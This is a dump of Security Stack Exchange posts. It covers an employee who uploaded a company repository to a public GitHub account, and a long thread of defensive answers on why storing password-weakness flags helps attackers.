<li>The inability to search within private repositories outside your organization.</li>
<li>Lots of false positives on abbreviated hashes.</li>
<li>Lots of false positives for common trees such as a freshly-initialized project skeleton.</li>
</ol>
<p>However, this may be useful <em>within</em> an organization's self-hosted repositories, or within common public repositories using their own search features. You may find other ways to perform OSINT as well, but avoid tinfoil hat territory. Your best bet is still to <strong>apply basic controls and data-loss prevention techniques</strong>, and then <strong>address policy violations in accordance with your organization's incident response process</strong>.</p>
","0"
"261168","261168","Employee uploaded proprietary private repository on his github public account","<p>A newly joined software engineer in our organization uploaded one of company's proprietary git repository on his personal Github public account, likely without nefarious intent.</p>
<p>How do I ensure this won't happen again in future? Apart from formal code of conducts, signing NDA etc. Are there any technical measures that can help (like firewalls etc)?</p>
","0","3","261182","<h3>Awareness will likely be your best bet</h3>
<p>If a user attempts to push code to one of their repositories, thinking it's theirs (and not the company's), then any error saying the push request failed will likely cause them to try and &quot;fix the issue&quot; and not realize they are being protected from a mistake.</p>
<p><strong>Discuss the incident</strong> with the programmer in question and ask them how it came to the circumstance. Keep in mind that the newly hired guy will likely feel <em>extremely</em> nervous, because joining and already causing a security incident doesn't make a good look. So make sure to make it known that it's not them getting investigated, it's the incident that is being investigated.</p>
<p>Then <strong>identify what factors lead to this incident</strong>. Is the onboarding process broken? There have been several incidents where newly hired developers attempted to bootstrap their dev environment and ran the setup script on the prod server instead of their local machine, wiping it completely. Or does the company workflow include personally-owned GitHub repositories? Is it perhaps &quot;lived workflow&quot; that employees want to work on their projects at home, so they clone them to private(?) GitHub repositories to bring their work home?</p>
<p>Next, <strong>develop mitigation strategies</strong> for these factors. If people feel like they have to circumvent company security controls to &quot;get their work done&quot;, then you need to re-work your security controls. If the onboarding process makes sense only to the person who developed it, but not to new hires, then rework that process to prevent future mistakes.</p>
<hr />
<p>Furthermore, while the technical mitigations mentioned in <a href=""https://security.stackexchange.com/a/261181/163495"">Todd A. Jacobs' answer</a> are worth implementing, I believe they should be seen as a secondary measure and not as something to be relied upon.</p>
","1"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261121","<p>Password hashing (with salting and slowness) is designed to make it indistinguishable from just having the hash if a password is weak or strong. Adding an additional indicator about the quality of the password allows an attacker to focus on the weak passwords and therefore significantly decreases the costs for an attacker.</p>
","103"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261122","<blockquote>
<p>I am implementing a system where I need to store passwords in a
database (hashed and all). My issue is that the business side requires
me to not enforce any constraint on them except length (8 characters
minimum)</p>
</blockquote>
<p>Translation: how to solve a problem that should not exist.</p>
<blockquote>
<p>Not following these advises would have liability implications on our
side. For example, we would allow a client to use 12345678 as a
password, but would not be liable if it gets brute forced.</p>
</blockquote>
<p>Well, even if your problem is purely a compliance issue, there are still some unresolved issues here. In a modern system, you are not supposed to store passwords in clear, but <strong>hash</strong> them. So you cannot really prove that the customer provided a weak password, since the original password is not known to you. What you are proposing is to store an &quot;indicator of weakness&quot; but it is somewhat subjective. It does not really tell <em>how bad</em> the password is. And what's the point really?</p>
<p>Even on a system that is enforcing strong passwords, you should still thwart <strong>brute force</strong> attempts. Example: ban the offending IP address for 15 minutes after 5 failed tries, something like that.</p>
<p>In case of a breach, and even if you can demonstrate it was caused by a weak password, shifting the blame onto the customer is not going to be well received.</p>
<p>If things go wrong, and litigation ensues as a result of a breach, you may have to demonstrate you undertook every reasonable effort to keep your systems secure and also protect the customers against themselves. Your password policy fails the test. It is below acceptable standards in 2022. There should be enough online resources you can use to convince the business analysts this is a terrible idea.</p>
<p>If I were in your shoes, I would downright refuse to program that thing or demand a liability waiver.</p>
<p>Remember: <s>if</s> when things go wrong, they will have to blame someone, and the someone could very well be you (&quot;the programmer didn't advise us against the flawed requirements&quot;). It's potentially your job and reputation on the line.</p>
","22"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261144","<p>If you <em>really</em> wanted to do this, you could have extra columns in your database.</p>
<pre><code>Password_Hash: CHAR(40)
Uses_Uppercase: Bool
Uses_Lowercase: Bool
Uses_Numbers: Bool
Uses_Symbols: Bool
Uses_More_Than_8_Chars: Bool
</code></pre>
<p>But, as others have pointed out - this does create <em>some</em> risk. If an attacker gets access to your database table, they can select all the passwords where <code>Uses_More_Than_8_Chars</code> is <code>False</code> and spend their effort brute forcing them.</p>
<p>Or they can perform dictionary attacks only on lowercase passwords with no numbers and symbols.</p>
<p>A better way might be to alert the user that their password is weak, and ask if they accept liability. If so, store a column on the User table <code>Accepts_Weak_Password_Liability: Bool</code>.</p>
<p>But, again, that's a signal for an attacker.</p>
<p>And, in any case, it doesn't help if the user has a complex password which they use everywhere. Or if they have it on a post-it. Or if they accidentally paste it somewhere.</p>
","3"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261149","<h2>TL;DR</h2>
<p>One of the possible ways to manage risk is to transfer it to a third party. This whole scheme is intended to transfer risk to system <em>users</em> instead of system <em>owners</em>, but introducing a non-standard system with increased inherent risk is likely to have the exact opposite effect. Instead, it is more likely that it will <em>increase</em> both inherent and residual risk without legally or effectively transferring any of that increased risk to a third party.</p>
<h2>Why No Reputable Framework Recommends This Approach</h2>
<p>There are a <em>lot</em> of anti-patterns to doing this. They include, but are not limited to:</p>
<ol>
<li>The naive approach to this would require parsing and hashing/encrypting the password server-side, which has its own set of problems when compared to client-side processing.</li>
<li>Being unable to hash and/or salt the password on the client side, unless you deconstruct the password client-side and pass additional information about the password's composition or format as metadata.</li>
<li>As a result of the items above, you can't have a zero-knowledge password system since some elements of the password must be known and stored/computed server-side even if the password is hashed or encrypted client-side.</li>
<li>This whole system creates opportunities for side-channel attacks, creates trails of metadata, and identifies low-complexity passwords for brute-forcing opportunities.</li>
<li><strong>It fundamentally solves the wrong problem by trying to shift risk to the system user rather than the owner of the system.</strong> This shift is unlikely to be auditable (and therefore largely unenforceable) unless you essentially break the security of the system even further than what you've already described.</li>
<li>Unless your legal department, auditors, cyber-insurance carrier, and infosec department have all agreed that this makes any sort of business sense, I'd personally put it on par with <em>creating</em> risk in the same way that people who roll their own encryption because they think they can do better than the entire field of peer-reviewed cryptography.</li>
<li>You can't point to a single peer-reviewed standard or widely-accepted security framework that would support this type of password policy.</li>
</ol>
<p>This list is by no means exhaustive. It's just illustrative of various ways that this approach should be a non-starter.</p>
<h2>Accurately Measure Your Business Risk</h2>
<p>In other  words, you're doing the wrong thing because someone has presumably decided it mitigates some aspect of business risk. Rather than doing that without doing the proper research, and then asking strangers on the Internet for reasons to do it or not, your organization needs to conduct a formal risk analysis to determine <em>if</em> it will measurably reduce your business risk in the first place. The company needs to think about the <a href=""https://en.wikipedia.org/wiki/OKR"" rel=""nofollow noreferrer"">OKRs</a> and controls involved and how they might apply to the business case.</p>
<p>Assuming that this approach would somehow measurably reduce risk, which is a dubious assumption at best, how do you plan to measure whether the residual risk of this control will be below your organization's risk appetite? How will you ensure that those residual risks (including less tangible risks like reputational harm to the organization) can <em>legally</em> or <em>effectively</em> be transferred to a third party?</p>
<p>The first part of this is really a leadership question, not a technical one. The second part is really a legal question, and can't be answered without the advice of legal counsel or input from the board of directors and/or senior leadership.</p>
<p>The triple-net is this whole thing sounds like you're way out on a limb and sawing vigorously, but your mileage may vary.</p>
<h2>See Also</h2>
<ul>
<li><a href=""https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"" rel=""nofollow noreferrer""><em>Security and Privacy Controls for Information Systems and Organizations</em>. NIST SP 800-53 Rev. 5, IA-5(1), pp. 139</a>.</li>
<li><a href=""https://www.schneier.com/blog/archives/2017/10/changes_in_pass.html"" rel=""nofollow noreferrer"">&quot;Changes in Password Best Practices&quot;. Schneier, Bruce. October 10, 2017</a></li>
<li><a href=""https://csrc.nist.gov/publications/detail/sp/800-63b/final"" rel=""nofollow noreferrer""><em>Digital Identity Guidelines Authentication and Lifecycle Management</em>. NIST Special Publication 800-63B, Appendix A, pp. 67-69.</a>
<ul>
<li>NB: Offline attacks and database breaches likely relevant to your use case are discussed in A.2 on pp. 67-68.</li>
<li>A.5 contains only a single four-sentence paragraph that address your implied threat model a lot better than a custom scheme. It could be used as a starting point to inform a risk-appropriate password policy when combined with widely-accepted controls.</li>
</ul>
</li>
</ul>
","4"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261152","<p>NO. You should not allow weak passwords, nor should you keep a record of a strength arbitrarily allocated to the ultimate password. This becomes problematic for stakeholders that insist on informational level audit trails.</p>
<p>The problem is twofold. Firstly you are conceding that there is a foreseeable risk. Secondly, you are identifying customers with weaker passwords.</p>
<p>You especially should not keep a dictionary with hashes of disallowed passwords, you may have users grandfathered-in. Joining these keys would be trivial. It matters not that you lock their accounts on your system. It may be in use elsewhere. It is however a valid intrusion attempt detection method to test for known &quot;scripted&quot; passwords, just do not hash them, or use some other way.</p>
","2"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261162","<p>So I'm going to tell you how to actually do this with no security compromise.</p>
<ul>
<li>Generate a public-private key pair for encryption. Use of RSA is advised.</li>
<li>Only give the application the public keypair</li>
<li>When given a new password, generate 112 bits of noise, prepend that onto your 32 bits of password weakness flags.</li>
<li>Encrypt that with AES-128 using a one-time key generated directly; you only have one block and the key is used once so don't bother with IV.</li>
<li>Encrypt the 128 bit key using the public key.</li>
<li>Store the resulting encrypted key and data block in the database.</li>
</ul>
<p>Store the private key offline somewhere; if you need to check if a password is weak, copy those two values and only those two values to your offline computer with the private key and read back the bits and determine the weaknesses.</p>
","5"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261166","<p>Actually, since your users don't need to know their &quot;weakness&quot; flags in order to login, there is absolutely <strong>no reason to store them in the same database as password hashes</strong>. You could store them in a separate data structure, probably even on a different server, and unlike hashes these flags can themselves be encrypted. In that case, they will not be &quot;leaked&quot; if your hash database is compromised.</p>
<p>I'm still not convinced you will ever use those flags in a legal dispute with a client, as they have no additional value. If a customer's account is compromised you can simply ask them what their password was, and if it was &quot;1234567&quot;, you can attempt to shift the blame to them in court by claiming their &quot;negligence&quot; or something, with or without your &quot;weakness&quot; flag.</p>
","0"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261177","<p>Slight frame challenge. Consider using something like the <a href=""https://haveibeenpwned.com/API/v3#PwnedPasswords"" rel=""nofollow noreferrer"">haveibeenpwned api</a> to check the passwords when they are set or changed. Present a message to the user indicating that they are using a known compromised password, and allow an override if you must (something like typing the sentence &quot;I agree to have my account compromised.&quot;). Store hashed passwords for the user for at least one password change (this is your proof after an attacker changes the password that the user was using a weak password).</p>
<p>Do NOT store a weak password indicator, but instead use the previously hashed password to indicate weakness if needed with a simple brute-force attack against the password if needed, with a timed attack using standard word-lists or attack methods. Or, if you must (and I would STRONGLY advise against it for all the reasons provided above and in the comments), store a simple flag indicating the user has bypassed the &quot;pwned password&quot; warning in a separate database/machine, etc. If you MUST go that route, don't label the flag clearly as &quot;idiot user&quot; or &quot;weak password&quot; or anything like that - maybe just a label like &quot;flag1&quot;. That flag should NEVER be cleared, if it is ever set, as it indicates the user has AT SOME TIME bypassed the warning, not that their current password is the weak one.</p>
","3"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261183","<p>Not a good idea. In a similar fashion, the police could attach written notes to all the house doors in a given neighbourhood, and have that notes state how breach-resistant the door is. The authorities will have a policy that people are allowed to have thin plywood doors, but the authorities are not responsible if burglars break into such houses.</p>
<p>In short, you are trying to use programmatic solution to solve a problem that is actually caused by human factor (certain fraction of users tend to use weak passwords). Potential rubber-hose analysis is also a thing to have in mind. Forcing password requirements to ensure sufficient strength is not a clean solution, and it is frustrating for users, but it does a good enough job at protecting you from liability; let's use it until we invent something better.</p>
","2"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261198","<p>It is impossible to reliable know that a password is not weak. Your algorithms can detect some weak passwords but you can't detect every weak password.
Some examples, all of this passwords are weak, would your software detect them as weak?</p>
<pre><code>n]j{No(i,mA$XI.dQNZY
Passw0rd!Passw0rd!Passw0rd!Passw0rd!
MyPasswordThatIAlsoUseInOtherServices12!
bl3iavN74RlOlbXxnW+d9+CGKOSWaeimquy26/DHLPQ
588+9PF8OZmpTyxvYS6KiI5bECaHjk4ZOYsjvTjsIho
1qQ2wQ3eE4rR5tT6zZ7uU8iI9oO0pP
0+Q&quot;W*EçR%T&amp;Z/U(I)O=P
a!00!a00!!aaaa!!00!a!0a0
</code></pre>
<p>Just because they are long, have special characters, digits and lower and uppercase letters does not mean they aren't weak.</p>
<p>Since you can't know if a password is strong, there is no point of storing the weakness level.</p>
","0"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
<p><strong>Final Edit:</strong> I have set @steffen-ullrich response as accepted. Lots of very good answers and I appreciate all the reason why I shouldn't do this but I wanted answers on what could go wrong and how one would go about doing it this way (many responses helped form the last edit). The legal aspect was provided to focus on the technical standpoint in light of a requirement I have no control over. My second edit basically describe what implementation would be a 0 compromise way of doing this. <strong>Disclaimer: this is pure curiosity and I have no plans to actually deploy this in production for the time being, I would recommend reading comments and chat threads before attempting this as they describe much of the problems and limitations of an approach like this.</strong></p>
","23","12","261200","<p>While you mustn't <em>store</em> complexity notes (since they can be used to target weaker passwords for cracking), you can certainly <strong>tell the user that their password is weak when they create it</strong>. Scare them with your policy and how you're doing your due diligence in telling them that it's weak and how a breach given this notice places the blame on them.</p>
<p>I think we've reached the point at which passwords should always be generated and managed by a password manager. This means there is never any reason to use a password shorter than 20 fully random printable characters (~92²⁰ possibilities), at least for anything that can properly interface with a password manager (e.g. a website as opposed to your computer's login screen).</p>
","1"
"261119","261119","Storing weakness level of passwords","<p>I am implementing a system where I need to store passwords in a database (hashed and all). My issue is that the business side requires me to not enforce any constraint on them except length (8 characters minimum), but highly advise to use special characters, uppercase characters or not use your first name. Not following these advises would have liability implications on our side. For example, we would allow a client to use <code>12345678</code> as a password, but would not be liable if it gets brute forced. This would require me to have an integer in my database that remembers this for the original password (pre-hashing). Any big no-no in doing this ?</p>
<p><strong>EDIT:</strong> Just to clarify, the integer would most-likely be a flag that represent the type of weakness, ie: too simple, commonly known weak password, uses personal information, etc..</p>
<p><strong>EDIT 2:</strong> Current solution based on the multiple answers and comments below would be to store an integer with flags that have been bit shifted. This integer would be stored in a separate database and encrypted using public-key cryptography, most likely using ECC.</p>
<p><strong>EDIT 3:</strong> This is only viable assuming basic security at lower levels (OS and network) as well as spam prevention. The system would block further attempts for sometimes after multiple failed attempts, password are securely hashed using both a (at least) 128 bits salt and time/memory consuming algorithm (Argon2id in this case).</p>
